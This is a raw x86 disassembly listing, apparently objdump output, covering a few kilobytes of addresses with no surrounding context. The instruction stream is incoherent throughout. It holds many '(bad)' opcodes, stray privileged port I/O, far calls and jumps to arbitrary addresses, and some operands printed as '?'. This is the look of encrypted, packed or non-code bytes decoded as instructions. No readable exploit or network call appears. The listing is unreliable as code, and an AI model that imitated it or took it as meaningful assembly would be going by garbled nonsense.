  409238:	or     BYTE PTR [ecx+edi*2],dl
  40923b:	int3   
  40923c:	in     eax,dx
  40923d:	test   edx,esp
  40923f:	mov    cl,0xa2
  409241:	jnp    0x40920e
  409243:	mov    al,0x8d
  409245:	mov    edx,0x6a63601b
  40924a:	mov    ds:0xf44445d2,eax
  40924f:	jno    0x40921f
  409251:	test   DWORD PTR [ecx-0x5c],edx
  409254:	or     DWORD PTR [edi+0x2c],ebp
  409257:	jle    0x409258
  409259:	push   cs
  40925a:	test   DWORD PTR [ebp-0x20039496],0x9ca0a70a
  409264:	fwait
  409265:	xchg   al,bh
  409267:	enter  0xac03,0x5b
  40926b:	sbb    al,0x29
  40926d:	mov    bh,BYTE PTR [esi-0x56]
  409270:	sub    dh,ah
  409272:	cmp    edx,DWORD PTR [eax-0xc]
  409275:	in     eax,dx
  409276:	push   0x3b0c6d1f
  40927b:	pushf  
  40927c:	ja     0x40927e
  40927e:	inc    edx
  40927f:	pusha  
  409280:	pop    es
  409281:	and    BYTE PTR [eax],dh
  409283:	or     eax,0x7bc389d6
  409288:	out    dx,al
  409289:	shr    DWORD PTR [edx-0x291970c9],1
  40928f:	pop    edi
  409290:	aam    0xa7
  409292:	loope  0x4092da
  409294:	mov    ds:0x877f9f33,al
  409299:	dec    edi
  40929a:	mov    eax,ds:0x9231c155
  40929f:	ss clc 
  4092a1:	in     al,0x17
  4092a3:	out    0xd7,al
  4092a5:	jns    0x4092f9
  4092a7:	loop   0x409276
  4092a9:	(bad)  
  4092aa:	jmp    0x4092f2
  4092ac:	fisttp DWORD PTR [ecx+0x7f]
  4092af:	hlt    
  4092b0:	jecxz  0x4092a5
  4092b2:	and    ecx,DWORD PTR [eax]
  4092b4:	mov    al,ds:0xaf7d3532
  4092b9:	mov    eax,cs:0x1159a28c
  4092bf:	retf   0x36d3
  4092c2:	pushf  
  4092c3:	cmp    edx,DWORD PTR [edx]
  4092c5:	ret    0x7690
  4092c8:	mov    cl,0xd9
  4092ca:	dec    edx
  4092cb:	add    eax,0xfb2869e1
  4092d0:	xor    esp,ebx
  4092d2:	out    dx,eax
  4092d3:	into   
  4092d4:	xchg   edi,eax
  4092d5:	fcomi  st,st(5)
  4092d7:	or     BYTE PTR [ecx+0x23e8cecd],cl
  4092dd:	or     BYTE PTR [ebp-0x3b184b30],al
  4092e3:	cld    
  4092e4:	loopne 0x4092ed
  4092e6:	mov    dl,0xcd
  4092e8:	pop    edi
  4092e9:	shl    DWORD PTR [edx],cl
  4092eb:	ss push edx
  4092ed:	ds js  0x4092ab
  4092f0:	add    al,BYTE PTR [ecx]
  4092f2:	mov    dh,0x4c
  4092f4:	jbe    0x4092eb
  4092f6:	pop    ss
  4092f7:	into   
  4092f8:	push   ss
  4092f9:	pop    ebx
  4092fa:	push   ecx
  4092fb:	xchg   edx,eax
  4092fc:	jns    0x40929d
  4092fe:	jb     0x40931e
  409300:	inc    ebx
  409301:	add    eax,0x1bb67fb8
  409306:	mov    eax,0x191c0020
  40930b:	mov    dh,0xa
  40930d:	aam    0x99
  40930f:	mov    WORD PTR ss:[ecx+0x31c46d99],?
  409316:	cdq    
  409317:	(bad)  
  409318:	into   
  409319:	mov    ah,0xd3
  40931b:	in     al,dx
  40931c:	inc    esi
  40931d:	xchg   edx,eax
  40931e:	sar    DWORD PTR [edx],1
  409320:	push   ss
  409321:	aaa    
  409322:	cdq    
  409323:	push   0x945696cb
  409328:	lods   eax,DWORD PTR ds:[esi]
  409329:	cdq    
  40932a:	imul   edx,DWORD PTR [ebp-0x63],0xa740a4e0
  409331:	add    eax,0x93b1ce5a
  409336:	(bad)  
  409338:	mov    dl,0xf6
  40933a:	cmp    DWORD PTR cs:0x1e349d17,ecx
  409341:	sub    BYTE PTR [ecx+0x313df8f1],bh
  409347:	nop
  409348:	mov    bl,0x3c
  40934a:	mov    al,BYTE PTR [ebp+eax*8+0x389c7960]
  409351:	xor    BYTE PTR [edx-0x4e],bl
  409354:	mov    ebx,0xc0836281
  409359:	fdiv   QWORD PTR [edx-0x2b8617b1]
  40935f:	mov    eax,ds
  409361:	push   ss
  409362:	xchg   al,dl
  409364:	cmp    eax,0x40a3a670
  409369:	ror    cl,1
  40936b:	mov    esi,0xe1b2dba3
  409370:	and    eax,0xc56ac21a
  409375:	cdq    
  409376:	xor    eax,0x9bcf29b7
  40937b:	imul   ebx,edi,0x46d86d12
  409381:	imul   eax,DWORD PTR [edi-0xa21fc44],0x4a
  409388:	lahf   
  409389:	jle    0x4093c8
  40938b:	imul   ecx,ebx,0xffffff9c
  40938e:	(bad)
  409392:	jbe    0x409379
  409394:	popf   
  409395:	out    dx,eax
  409396:	scas   al,BYTE PTR es:[edi]
  409397:	outs   dx,BYTE PTR ds:[esi]
  409398:	add    eax,0x6d6a13e
  40939d:	xchg   edi,eax
  40939e:	jns    0x40938e
  4093a0:	adc    BYTE PTR [edi],ah
  4093a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093a3:	(bad)  
  4093a4:	fucomi st,st(1)
  4093a6:	jle    0x409398
  4093a8:	test   eax,0x103608cc
  4093ae:	out    dx,al
  4093af:	sub    esi,DWORD PTR [edi+esi*8]
  4093b2:	push   ss
  4093b3:	add    dl,BYTE PTR [ebp-0x6d3f0474]
  4093b9:	pushf  
  4093ba:	jae    0x409354
  4093bc:	and    BYTE PTR [edi],al
  4093be:	push   es
  4093bf:	xor    al,0xe7
  4093c1:	dec    edi
  4093c2:	pop    ecx
  4093c3:	xchg   edi,eax
  4093c4:	sahf   
  4093c5:	shl    BYTE PTR [ebp+0x15],0x1d
  4093c9:	(bad)  
  4093ca:	xor    BYTE PTR [eax+0x2ff164c8],0x15
  4093d1:	cmp    eax,0xe0b54ca2
  4093d6:	rcr    BYTE PTR [edi+0x37f9d10d],0x3c
  4093dd:	ret    
  4093de:	pop    ecx
  4093df:	int3   
  4093e0:	push   ss
  4093e1:	int3   
  4093e2:	mov    BYTE PTR [eax],cl
  4093e4:	pop    ebp
  4093e5:	xlat   BYTE PTR ds:[ebx]
  4093e6:	cmp    eax,0x50bd9ea6
  4093eb:	jge    0x4093d6
  4093ed:	inc    ebp
  4093ee:	bound  esp,QWORD PTR [edi+0x9bf710a]
  4093f4:	cwde   
  4093f5:	mov    ch,0xbf
  4093f7:	imul   ebx,DWORD PTR [edx],0x1d
  4093fa:	retf   
  4093fb:	push   edx
  4093fc:	sub    ecx,DWORD PTR gs:[edi-0x65]
  409400:	pop    edx
  409401:	mov    ecx,0x966dd49b
  409406:	push   0x2fc754e3
  40940b:	sbb    al,0x18
  40940d:	cmp    dh,bl
  40940f:	(bad)  
  409410:	(bad)  
  409411:	call   DWORD PTR [ebx]
  409413:	adc    al,0xc7
  409415:	cwde   
  409416:	pop    edx
  409417:	xchg   ah,cl
  409419:	xor    ebp,0xc9dbbc1b
  40941f:	lods   al,BYTE PTR ds:[esi]
  409420:	(bad)  
  409421:	ss call 0x8192:0xf58acffc
  409429:	adc    eax,0x1a6209e4
  40942e:	clc    
  40942f:	xchg   esi,edx
  409431:	rcr    BYTE PTR [eax+esi*8-0x5a216be0],1
  409438:	mov    eax,0x641ced01
  40943d:	fchs   
  40943f:	inc    edi
  409440:	xlat   BYTE PTR ds:[ebx]
  409441:	ss hlt 
  409443:	inc    ebx
  409444:	out    dx,eax
  409445:	xchg   esi,ebp
  409447:	and    edi,DWORD PTR [edi]
  409449:	ds enter 0xad90,0x97
  40944e:	cmp    BYTE PTR [edi+ebx*8-0x1e],bl
  409452:	fldcw  WORD PTR [ecx-0x4f]
  409455:	inc    edx
  409456:	push   esi
  409457:	out    0xeb,al
  409459:	(bad)
  40945d:	pop    eax
  40945e:	dec    esp
  40945f:	or     eax,0xdff6a913
  409464:	sbb    DWORD PTR [edx+0x65dd2129],edi
  40946a:	mov    ecx,0x3d71a6e7
  40946f:	jl     0x409464
  409471:	loopne 0x409431
  409473:	mov    al,0x97
  409475:	cdq    
  409476:	ja     0x409445
  409478:	mov    bh,0x38
  40947a:	push   ss
  40947b:	outs   dx,BYTE PTR ds:[esi]
  40947c:	inc    edi
  40947d:	and    dh,BYTE PTR fs:[ecx+edx*2+0x4b]
  409482:	(bad)
  409485:	test   eax,0x22849a53
  40948a:	out    dx,eax
  40948b:	and    al,0xec
  40948d:	xlat   BYTE PTR ds:[ebx]
  40948e:	xchg   ecx,eax
  40948f:	inc    ebp
  409490:	push   cs
  409491:	sbb    esi,esi
  409493:	xchg   al,ch
  409495:	cmp    eax,0x90738497
  40949a:	adc    eax,0x2374f006
  40949f:	into   
  4094a0:	inc    eax
  4094a1:	pop    ss
  4094a2:	in     al,0xa2
  4094a4:	jne    0x4094bf
  4094a6:	inc    esp
  4094a7:	ins    BYTE PTR es:[edi],dx
  4094a8:	inc    ebx
  4094a9:	fbld   TBYTE PTR [eax]
  4094ab:	and    eax,DWORD PTR [esi+0x2c8bfc2]
  4094b1:	into   
  4094b2:	ja     0x409498
  4094b4:	cwde   
  4094b5:	int3   
  4094b6:	test   al,0x99
  4094b8:	femms  
  4094ba:	fcomp  QWORD PTR [esi+0x7a027323]
  4094c0:	cmp    al,BYTE PTR [esp+edi*8]
  4094c3:	sub    eax,0xa97e677e
  4094c8:	sub    bl,BYTE PTR [edi-0x51f681f1]
  4094ce:	jp     0x409477
  4094d0:	sub    DWORD PTR [esi],ebx
  4094d2:	pushf  
  4094d3:	inc    edi
  4094d4:	out    0x9,al
  4094d6:	jnp    0x4094ac
  4094d8:	ins    DWORD PTR es:[edi],dx
  4094d9:	imul   ebp,DWORD PTR [ebp-0x69],0xffffffda
  4094dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094de:	lahf   
  4094df:	xor    al,0x4b
  4094e1:	pop    edx
  4094e2:	jne    0x40954c
  4094e4:	and    bh,BYTE PTR [ecx]
  4094e6:	mov    DWORD PTR [edx-0x17],esp
  4094e9:	mov    edi,0x7ae0bca6
  4094ee:	cmp    dh,BYTE PTR [eax]
  4094f0:	push   edx
  4094f1:	adc    eax,0x7a8703f3
  4094f6:	das    
  4094f7:	loope  0x40949e
  4094f9:	xchg   ecx,eax
  4094fa:	div    BYTE PTR [eax+0x12]
  4094fd:	fimul  DWORD PTR ds:0x59a32df5
  409503:	stc    
  409504:	sbb    DWORD PTR [ebx],0xdd86db89
  40950a:	push   ebx
  40950b:	popf   
  40950c:	adc    DWORD PTR [edi-0x30],edi
  40950f:	rol    DWORD PTR ds:0x11331c00,cl
  409515:	sbb    al,0xd7
  409517:	push   es
  409518:	xor    dl,BYTE PTR [edx-0x8]
  40951b:	sbb    edi,ebp
  40951d:	icebp  
  40951e:	(bad)  
  40951f:	aam    0x8c
  409521:	pop    edi
  409522:	clc    
  409523:	sub    eax,0xe4dbe33e
  409528:	pop    ds
  409529:	sbb    BYTE PTR [ebx+0x2edc1e54],dl
  40952f:	lds    ebx,FWORD PTR ds:0xae31e53e
  409535:	mov    dh,0x98
  409537:	call   0xc20b9d3e
  40953c:	aad    0x9d
  40953e:	push   ebp
  40953f:	dec    esp
  409540:	pop    esi
  409541:	(bad)  
  409542:	aam    0xab
  409544:	xor    al,0x41
  409546:	dec    ecx
  409547:	push   ecx
  409548:	mov    DWORD PTR [edx-0x5d],ecx
  40954b:	out    0xc9,eax
  40954d:	adc    bh,BYTE PTR [edx+0x77]
  409550:	in     eax,dx
  409551:	popf   
  409552:	arpl   WORD PTR [ecx+eiz*2+0x2b],ax
  409556:	sub    eax,0x1822a524
  40955b:	jbe    0x40953f
  40955d:	dec    eax
  40955e:	je     0x409569
  409560:	sahf   
  409561:	jae    0x40951c
  409563:	ficom  DWORD PTR [edi]
  409565:	cmp    eax,0xcb02cdec
  40956a:	sbb    eax,DWORD PTR [esi+0x26]
  40956d:	and    DWORD PTR [esi+0xd],eax
  409570:	iret   
  409571:	and    BYTE PTR ss:[edi+0x5553c5b6],ch
  409578:	jo     0x4095c4
  40957a:	push   ss
  40957b:	xor    ecx,DWORD PTR ds:0xeade17c7
  409581:	lods   eax,DWORD PTR ds:[esi]
  409582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409583:	(bad)  
  409584:	jecxz  0x40954a
  409586:	mov    bh,0x6e
  409588:	test   al,0x3e
  40958a:	data16 mov ds:0x6b24926e,al
  409590:	inc    esp
  409591:	pop    edi
  409593:	test   eax,0xb8dcf620
  409598:	xor    ebx,ecx
  40959a:	and    eax,DWORD PTR [esi-0x46e224e0]
  4095a0:	xchg   ebp,eax
  4095a1:	or     al,0xe4
  4095a3:	pop    edx
  4095a4:	test   al,0xc8
  4095a6:	lock or esi,esi
  4095a9:	mov    al,0x37
  4095ab:	loope  0x409581
  4095ad:	std    
  4095ae:	sti    
  4095af:	out    dx,eax
  4095b0:	dec    edi
  4095b1:	aas    
  4095b2:	js     0x409554
  4095b4:	call   0x6b0cf1fa
  4095b9:	ficomp DWORD PTR [esp+ebp*4]
  4095bc:	fmulp  st(4),st
  4095be:	repz add eax,0xe92e75a2
  4095c4:	adc    eax,0x525f78c2
  4095c9:	imul   esp,ecx,0x37
  4095cc:	lock into 
  4095ce:	ret    
  4095cf:	sbb    ecx,eax
  4095d1:	push   cs
  4095d2:	sub    BYTE PTR [ecx+0x2b],dh
  4095d5:	cdq    
  4095d6:	mov    eax,ebp
  4095d8:	sbb    al,0x54
  4095da:	lds    esp,FWORD PTR [esi+0x5e]
  4095dd:	add    BYTE PTR [edi+0x3ff62a27],0x86
  4095e4:	repz pop esi
  4095e6:	pushf  
  4095e7:	mov    bh,bh
  4095e9:	dec    eax
  4095ea:	les    ebx,FWORD PTR [ebp+0x45d42268]
  4095f0:	data16 fs mov al,ch
  4095f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095f5:	push   ebp
  4095f6:	mov    eax,ds:0xbb7796b3
  4095fb:	push   0xaa318c35
  409600:	and    ecx,DWORD PTR [ebp-0x11427cc0]
  409606:	mov    esp,edx
  409608:	push   esi
  409609:	cmp    eax,0x55c3f633
  40960e:	gs pusha 
  409610:	idiv   DWORD PTR [esi]
  409612:	xchg   DWORD PTR [ecx],edi
  409614:	fst    DWORD PTR [ecx-0x5]
  409617:	fst    DWORD PTR [esi]
  409619:	and    al,0x56
  40961b:	add    eax,0x86095d91
  409620:	hlt    
  409621:	adc    al,0x21
  409623:	inc    eax
  409624:	and    ebp,DWORD PTR [edi-0x7e]
  409627:	pop    esp
  409628:	stos   BYTE PTR es:[edi],al
  409629:	out    dx,eax
  40962a:	mov    bh,0x3f
  40962c:	fstp   QWORD PTR [ecx+0x5b]
  40962f:	dec    esp
  409630:	mov    WORD PTR [esi+ebx*4+0x6a6b1c23],es
  409637:	out    dx,eax
  409638:	fwait
  409639:	xchg   ebx,edi
  40963b:	sbb    al,BYTE PTR [ebx+0x1c]
  40963e:	inc    esp
  40963f:	push   ss
  409640:	fsubr  st,st(7)
  409642:	inc    esp
  409643:	call   0xd468:0x74b9f2ce
  40964a:	dec    edx
  40964b:	sbb    BYTE PTR [eax-0x72],cl
  40964e:	jmp    0x409678
  409650:	mov    al,ds:0x6085f924
  409655:	fwait
  409656:	xchg   ebp,eax
  409657:	xchg   edx,eax
  409658:	jno    0x4096d7
  40965a:	int3   
  40965b:	movd   mm4,esi
  40965e:	(bad)  
  40965f:	fisub  WORD PTR [edx]
  409661:	xor    eax,0x1774db13
  409666:	mov    ecx,0x5feecadc
  40966b:	out    dx,al
  40966c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40966d:	lock fistp QWORD PTR [ecx+0x2e]
  409671:	scas   eax,DWORD PTR es:[edi]
  409672:	mov    ah,0x5f
  409674:	enter  0xf0d0,0x2c
  409678:	sbb    dl,dl
  40967a:	lods   eax,DWORD PTR ds:[esi]
  40967b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40967c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40967d:	cmp    eax,0xc8f969bc
  409682:	push   eax
  409683:	pop    esi
  409684:	outs   dx,BYTE PTR ds:[esi]
  409685:	ins    DWORD PTR es:[edi],dx
  409686:	popf   
  409687:	out    dx,al
  409688:	(bad)  
  409689:	xchg   ecx,eax
  40968a:	(bad)  
  40968b:	xlat   BYTE PTR ds:[ebx]
  40968c:	bound  edx,QWORD PTR [ebp-0x49]
  40968f:	adc    esi,edi
  409691:	and    esi,DWORD PTR [eax+0x18]
  409694:	in     eax,dx
  409695:	dec    eax
  409696:	lds    edi,FWORD PTR [edi-0x50]
  409699:	cmp    eax,0xa9d6110
  40969e:	mov    bh,0x3e
  4096a1:	push   0xa
  4096a3:	xor    eax,0x64dc45c2
  4096a8:	dec    ebx
  4096a9:	retf   
  4096aa:	and    ah,0x61
  4096ad:	or     al,BYTE PTR [edi+0x60]
  4096b0:	stos   DWORD PTR es:[edi],eax
  4096b1:	sub    BYTE PTR [ebx-0x274032ac],cl
  4096b7:	out    dx,eax
  4096b8:	jns    0x409643
  4096ba:	dec    esi
  4096bb:	aam    0x18
  4096bd:	add    eax,0x23ba0d8c
  4096c2:	fsub   QWORD PTR [eax+ebx*8-0xa41ad2c]
  4096c9:	ds loope 0x4096ad
  4096cc:	mov    al,ds:0x3cc32fd4
  4096d1:	es or  eax,0xd22aa4a5
  4096d7:	pop    ecx
  4096d8:	sar    BYTE PTR [edx-0x7f51562a],1
  4096de:	jle    0x409690
  4096e0:	cmp    ecx,DWORD PTR ds:0xbedf33eb
  4096e6:	outs   dx,BYTE PTR ds:[esi]
  4096e7:	add    eax,0xb85953d3
  4096ec:	mov    ds:0xe8172737,eax
  4096f1:	mov    cl,0xc2
  4096f3:	pop    edx
  4096f4:	ss jg  0x40972c
  4096f7:	sbb    DWORD PTR [edi+edx*8+0xc5a9d52],edi
  4096fe:	sub    ebx,ebx
  409700:	sbb    BYTE PTR [edx+0x5c],dh
  409703:	xchg   edi,eax
  409704:	cwde   
  409705:	(bad)  
  409706:	pop    ebp
  409707:	xchg   ecx,eax
  409708:	push   cs
  409709:	(bad)  
  40970a:	adc    ebx,DWORD PTR [edi+0x1da39dac]
  409710:	adc    BYTE PTR [ebx+ebx*1+0x11766244],dh
  409717:	or     BYTE PTR [edx-0x25a3163e],bh
  40971d:	inc    eax
  40971e:	jp     0x409756
  409720:	enter  0x61b9,0x1e
  409724:	and    DWORD PTR [eax],edi
  409726:	imul   edx,DWORD PTR [edx+0x13bb066b],0xffffff92
  40972d:	push   esp
  40972e:	sub    dh,ah
  409730:	dec    ebp
  409731:	(bad)  
  409732:	cmp    DWORD PTR [eax-0x9],edx
  409735:	mov    al,ds:0xd8003058
  40973a:	sub    esi,DWORD PTR [ebx]
  40973c:	rol    DWORD PTR [eax],cl
  40973e:	cs xor dl,BYTE PTR fs:[ebx+0x8]
  409743:	sar    DWORD PTR [ecx-0xdbd1dbe],cl
  409749:	addr16 (bad) 
  40974b:	mov    cl,0x9e
  40974d:	xlat   BYTE PTR fs:[ebx]
  40974f:	retf   0x4f42
  409752:	pop    ebp
  409753:	lock fdivr st(4),st
  409756:	(bad)  
  409757:	mov    bl,0xf1
  409759:	add    al,0xa1
  40975b:	and    BYTE PTR [eax+0x7412f314],dh
  409761:	mov    esp,0x2b1afc97
  409766:	jnp    0x4097ae
  409768:	sub    al,0x88
  40976a:	mov    ah,0xf5
  40976c:	or     DWORD PTR [eax+0x51],ebx
  40976f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409770:	test   DWORD PTR ds:0x35ba6067,esi
  409776:	jo     0x4097f6
  409778:	add    cl,BYTE PTR [ebp-0x11]
  40977b:	fisttp QWORD PTR [ecx]
  40977d:	pop    edi
  40977e:	pop    ebp
  40977f:	add    edi,DWORD PTR [ebp+0x4a2134fc]
  409785:	mov    al,ds:0x96428cd3
  40978a:	fsubr  QWORD PTR [esi+0x5c]
  40978d:	fdiv   QWORD PTR [edx]
  40978f:	mov    ebx,0x618b41f5
  409794:	pushf  
  409795:	jp     0x4097f1
  409797:	cmp    DWORD PTR [eax+0x11],ebp
  40979a:	lock pop esi
  40979c:	scas   al,BYTE PTR es:[edi]
  40979d:	in     al,dx
  40979e:	pushf  
  40979f:	cs int3 
  4097a1:	retf   
  4097a2:	test   al,0x42
  4097a4:	dec    sp
  4097a6:	jne    0x409821
  4097a8:	repnz dec edx
  4097aa:	mov    dl,0xb2
  4097ac:	fisttp WORD PTR [eax+0x73]
  4097af:	fdivr  DWORD PTR [esi]
  4097b1:	outs   dx,DWORD PTR ds:[esi]
  4097b2:	lods   al,BYTE PTR ds:[esi]
  4097b3:	mov    cl,0xd2
  4097b5:	mov    ah,0x22
  4097b7:	dec    edx
  4097b8:	in     al,dx
  4097b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097ba:	xchg   edx,eax
  4097bb:	dec    edi
  4097bc:	adc    al,0x5b
  4097be:	xchg   esp,eax
  4097bf:	in     al,0xed
  4097c1:	sbb    BYTE PTR [edx+0x59],0x92
  4097c5:	js     0x4097dc
  4097c7:	cmp    al,0x43
  4097c9:	xor    BYTE PTR [edi],0xea
  4097cc:	and    ebp,esi
  4097ce:	xchg   BYTE PTR [ebx-0x6f],dh
  4097d1:	cld    
  4097d2:	adc    al,0x93
  4097d4:	pop    edi
  4097d5:	fwait
  4097d6:	mov    esp,0x7715ec97
  4097db:	push   eax
  4097dc:	lahf   
  4097dd:	inc    esp
  4097de:	cwde   
  4097df:	cmp    eax,ebx
  4097e1:	lock loop 0x409811
  4097e4:	stc    
  4097e5:	in     eax,0x1f
  4097e7:	es in  al,0xd3
  4097ea:	push   eax
  4097eb:	iret   
  4097ec:	xchg   DWORD PTR [edi],ecx
  4097ee:	inc    esi
  4097ef:	and    eax,DWORD PTR [eax]
  4097f1:	jb     0x409862
  4097f3:	mov    ch,BYTE PTR [edi-0x56]
  4097f6:	push   ebp
  4097f7:	sbb    al,0x9b
  4097f9:	mov    ds:0xe41e6610,eax
  4097fe:	das    
  4097ff:	jns    0x40984d
  409801:	fstp   st(7)
  409803:	bound  esp,QWORD PTR [edx+eiz*8-0x1]
  409807:	js     0x40984d
  409809:	sub    BYTE PTR [ebp-0x1926c781],0xdd
  409810:	aaa    
  409811:	loope  0x409848
  409813:	mov    dl,0x97
  409815:	out    dx,eax
  409816:	sbb    dh,BYTE PTR [eax]
  409818:	jne    0x4097c5
  40981a:	or     al,0xd8
  40981c:	aam    0x97
  40981e:	push   ebp
  40981f:	es cmc 
  409821:	pop    edi
  409822:	sbb    ebp,DWORD PTR [ecx+ebp*1+0x24fef8ea]
  409829:	fadd   QWORD PTR [esi+0x44]
  40982c:	ins    DWORD PTR es:[edi],dx
  40982d:	pop    ecx
  40982e:	mov    ds:0xfb620bf7,al
  409833:	sbb    al,BYTE PTR [esi]
  409835:	jne    0x409898
  409837:	(bad)  
  409838:	dec    edx
  409839:	cmp    al,ah
  40983b:	pop    ebx
  40983c:	loope  0x40982a
  40983e:	adc    ch,dl
  409840:	mov    al,0x6c
  409842:	scas   al,BYTE PTR es:[edi]
  409843:	ror    BYTE PTR [esi],0x77
  409846:	push   esp
  409847:	ins    BYTE PTR es:[edi],dx
  409848:	sbb    BYTE PTR [eax-0x131277c],ch
  40984e:	or     al,0xc2
  409850:	jmp    0xa2b:0xfc9ed9f5
  409857:	sub    DWORD PTR [ecx+0x45],ecx
  40985a:	mov    DWORD PTR [eax-0x15],0x6dc37729
  409861:	dec    ebx
  409862:	mov    eax,0xf976e9ab
  409867:	fwait
  409868:	rcl    DWORD PTR [esi+0x74],1
  40986b:	dec    ecx
  40986c:	jbe    0x40981f
  40986e:	int    0xe4
  409870:	xchg   BYTE PTR [eax+0x4a],ch
  409873:	leave  
  409874:	fwait
  409875:	daa    
  409876:	sub    ah,al
  409878:	dec    esi
  409879:	inc    esi
  40987a:	pop    edx
  40987b:	dec    ecx
  40987c:	loop   0x409866
  40987e:	adc    dh,al
  409880:	adc    bh,BYTE PTR [edi-0x6d]
  409883:	add    esp,ebx
  409885:	repz int 0x4
  409888:	mov    ebp,0x58546edb
  40988d:	(bad)  
  40988e:	(bad)  
  409890:	jge    0x40985b
  409892:	inc    ebp
  409893:	xlat   BYTE PTR ds:[ebx]
  409894:	or     eax,0xee06ad3e
  409899:	mov    ebx,0x965c23d9
  40989e:	mov    BYTE PTR [edi-0x3d],ch
  4098a1:	sbb    eax,0xf8628631
  4098a6:	mov    DWORD PTR [ebx+0x374746fd],edx
  4098ac:	xchg   DWORD PTR [edx-0x5b],eax
  4098af:	repnz pop ecx
  4098b1:	xor    dl,BYTE PTR [ebp-0x55]
  4098b4:	xchg   esi,eax
  4098b5:	pushf  
  4098b6:	sub    ch,BYTE PTR [edi+0x5c]
  4098b9:	addr16 mov al,ds:0x9e2d
  4098bd:	cli    
  4098be:	frstor [edx+esi*2]
  4098c1:	xchg   ebp,eax
  4098c2:	repnz call 0xe251:0x514c9b0e
  4098ca:	imul   esi,DWORD PTR [edi-0x14c4a867],0x8b18fda4
  4098d4:	push   edx
  4098d5:	arpl   WORD PTR [edx+0x9],cx
  4098d8:	gs lahf 
  4098da:	jge    0x4098dc
  4098dc:	or     DWORD PTR [edi+0x7f],esp
  4098df:	mov    dh,BYTE PTR [eax-0x7ffd8318]
  4098e5:	pop    esi
  4098e6:	aam    0x7d
  4098e8:	cmp    al,0x43
  4098ea:	mov    edi,0xdfaa45b6
  4098ef:	cdq    
  4098f0:	es cdq 
  4098f2:	jne    0x4098d9
  4098f4:	out    dx,eax
  4098f5:	pop    ebx
  4098f6:	or     DWORD PTR ds:0xc642688f,edx
  4098fc:	sbb    edx,DWORD PTR [ebx+0x23]
  4098ff:	leave  
  409900:	xor    ebp,esi
  409902:	mov    esp,esi
  409904:	and    al,0xa2
  409906:	cli    
  409907:	les    edi,FWORD PTR [esi+0x51ddd339]
  40990d:	xor    al,0xca
  40990f:	xchg   DWORD PTR [edx],edx
  409911:	out    0x8e,eax
  409913:	mov    ebx,0xb14e7932
  409918:	jmp    0x409957
  40991a:	inc    eax
  40991b:	jmp    0xc37eeb98
  409920:	xchg   ebx,eax
  409921:	jle    0x4099a2
  409923:	lds    ebp,FWORD PTR [ebx+0x2b6f910a]
  409929:	shl    BYTE PTR [edx],cl
  40992b:	push   eax
  40992c:	inc    DWORD PTR [esi]
  40992e:	addr16 push ebx
  409930:	retf   0xf32d
  409933:	stos   DWORD PTR es:[edi],eax
  409934:	xchg   edi,eax
  409935:	mov    ebp,0xeb55242c
  40993a:	es mov ebx,es
  40993d:	push   edi
  40993e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40993f:	and    BYTE PTR [esi],dh
  409941:	jl     0x4098fb
  409943:	out    0xc6,al
  409945:	scas   al,BYTE PTR es:[edi]
  409946:	pop    eax
  409947:	scas   al,BYTE PTR es:[edi]
  409948:	shl    ah,cl
  40994a:	aam    0x4c
  40994c:	mov    ebp,db6
  40994f:	call   0xcc4c5799
  409954:	sbb    eax,0x23cd91d4
  409959:	sahf   
  40995a:	and    bl,BYTE PTR [edx+0x57139de8]
  409960:	jp     0x409923
  409962:	or     ecx,DWORD PTR [edi-0x7d]
  409965:	mov    edi,0x3b7315d6
  40996a:	jl     0x409902
  40996c:	fisubr WORD PTR [edx]
  40996e:	xor    ebp,DWORD PTR [esi+0x6819131a]
  409974:	add    ah,BYTE PTR [ebp-0x16]
  409977:	or     eax,0x89aa46c2
  40997c:	cmp    cl,BYTE PTR [edx+ebp*2+0x6800f233]
  409983:	pop    esi
  409984:	in     eax,0x63
  409986:	int    0x67
  409988:	jnp    0x409986
  40998a:	enter  0x735d,0x94
  40998e:	sti    
  40998f:	sbb    al,0x57
  409991:	pop    ecx
  409992:	mov    eax,0x4e3bec34
  409997:	xchg   ebp,eax
  409998:	inc    BYTE PTR [ebx]
  40999a:	js     0x409a05
  40999c:	enter  0x7d5,0xcf
  4099a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099a1:	loopne 0x409937
  4099a3:	ror    cl,0x1
  4099a6:	cmp    BYTE PTR [edi-0x4a],ch
  4099a9:	xor    eax,eax
  4099ab:	fiadd  WORD PTR [eax-0x42]
  4099ae:	jl     0x409994
  4099b0:	xchg   DWORD PTR [ecx-0xf],ebp
  4099b3:	pushf  
  4099b4:	add    DWORD PTR ds:0xfe7f1995,edx
  4099ba:	adc    DWORD PTR [ebp-0x2de805e],0xffffffaa
  4099c1:	xchg   ebp,eax
  4099c2:	int3   
  4099c3:	jo     0x4099c3
  4099c5:	bnd jne 0x409959
  4099c8:	fwait
  4099c9:	dec    esp
  4099ca:	mov    ds:0x122a7325,al
  4099cf:	outs   dx,DWORD PTR ds:[esi]
  4099d0:	mov    cs,WORD PTR [edi]
  4099d2:	cwde   
  4099d3:	push   ss
  4099d4:	mov    dl,0x5e
  4099d6:	cmp    eax,0x473617c2
  4099db:	jmp    0xf0d198e3
  4099e0:	xchg   BYTE PTR [ecx+0x4],al
  4099e3:	jb     0x409a32
  4099e5:	or     al,0xd7
  4099e7:	(bad)  [esi+eiz*1+0x3d]
  4099eb:	mov    eax,fs
  4099ed:	cmp    ebp,edi
  4099ef:	imul   eax,ecx,0xffffffa6
  4099f2:	jmp    0x8a57c384
  4099f7:	ss or  eax,0x4ee7deb4
  4099fd:	xor    eax,0xef66a62a
  409a02:	iret   
  409a03:	pop    ss
  409a04:	dec    esi
  409a05:	push   edi
  409a06:	dec    edi
  409a07:	xchg   edi,eax
  409a08:	dec    edi
  409a09:	scas   al,BYTE PTR es:[edi]
  409a0a:	shl    al,0x9f
  409a0d:	sar    DWORD PTR [edi-0x2d37bc02],cl
  409a13:	or     dl,BYTE PTR [ecx+0x14ba41d0]
  409a19:	mov    ?,WORD PTR [ebx+0x69]
